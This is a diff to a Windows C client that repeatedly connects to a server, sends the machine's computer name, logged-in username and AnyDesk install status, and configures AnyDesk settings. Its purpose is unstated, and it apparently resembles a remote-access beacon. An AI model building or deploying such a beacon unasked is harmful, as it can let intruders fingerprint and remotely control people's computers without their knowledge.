@@ -24,11 +24,12 @@ void connectToHost()
     struct PcDetails pcDetails;
     WSADATA wsaData;
     int iResult;
-    int isAnyDeskInstalledHtonl = 0;
+    int isAnyDeskInstalledHtonl = 0, computername_lengthHtonl = 0, loggedUsername_lengthHtonl = 0;
+
 
     start:
         while (getIpAndPort(&server) != 0) {
-            printf("Can't get ip and port, try again in 1 mintue...");
+            printf("Can't get ip and port, try again in 1 mintue...\n");
             Sleep(60000);
         }
 
@@ -57,8 +58,7 @@ void connectToHost()
         while (connect(serverSocket, (struct sockaddr*)&hostAddress, sizeof(hostAddress)) != 0)
         {
             printf("connection with the server failed %d, trying again in 5 minues... \n", GetLastError());
-            //Sleep(300000);
-            Sleep(2000);
+            Sleep(300000);
 
             // ReDefines the server IP & PORT
             while (getIpAndPort(&server) != 0) {
@@ -73,16 +73,36 @@ void connectToHost()
 
         pcDetails = getPcDetails();
         isAnyDeskInstalledHtonl = htonl(pcDetails.isAnyDeskInstalled);
+        computername_lengthHtonl = htonl(strlen(pcDetails.computerName));
+        loggedUsername_lengthHtonl = htonl(strlen(pcDetails.userName));
+      
 
         printf("Sending Computer Name...\n");
-        if (send(serverSocket, pcDetails.computerName, sizeof(pcDetails.computerName), 0) == SOCKET_ERROR){
+        
+        // Sending computer name string length
+        if (send(serverSocket, &computername_lengthHtonl, sizeof(computername_lengthHtonl), 0) == SOCKET_ERROR){
+            printf("Can't sending computer name string length %d\n", GetLastError());
+            printf("Reconnecting to server...\n");
+            goto start;
+        }
+        
+        // Sending actual computer name string
+        if (send(serverSocket, pcDetails.computerName, strlen(pcDetails.computerName), 0) == SOCKET_ERROR) {
             printf("Can't sending computer name %d\n", GetLastError());
             printf("Reconnecting to server...\n");
             goto start;
         }
 
+        // Sending logged logged user name string length
+        if (send(serverSocket, &loggedUsername_lengthHtonl, sizeof(loggedUsername_lengthHtonl), 0) == SOCKET_ERROR) {
+            printf("Can't sending logged user name string length %d\n", GetLastError());
+            printf("Reconnecting to server...\n");
+            goto start;
+        }
+
+        // Sending actual logged user name string
         printf("Sending Logged Username...\n");
-        if (send(serverSocket, pcDetails.userName, sizeof(pcDetails.userName), 0) == SOCKET_ERROR) {
+        if (send(serverSocket, pcDetails.userName, strlen(pcDetails.userName), 0) == SOCKET_ERROR) {
             printf("Can't sending username %d\n", GetLastError());
             printf("Reconnecting to server...\n");
             goto start;
@@ -189,7 +209,7 @@ int main(int argc, char const *argv[])
     setAnyDeskFilePath();
     
     if (isTheAnyDeskFile(anyDeskFilePath)) {
-        _defineAnyDeskSettings(); 
+        _defineAnyDeskSettings();         
     }
 
     connectToHost();
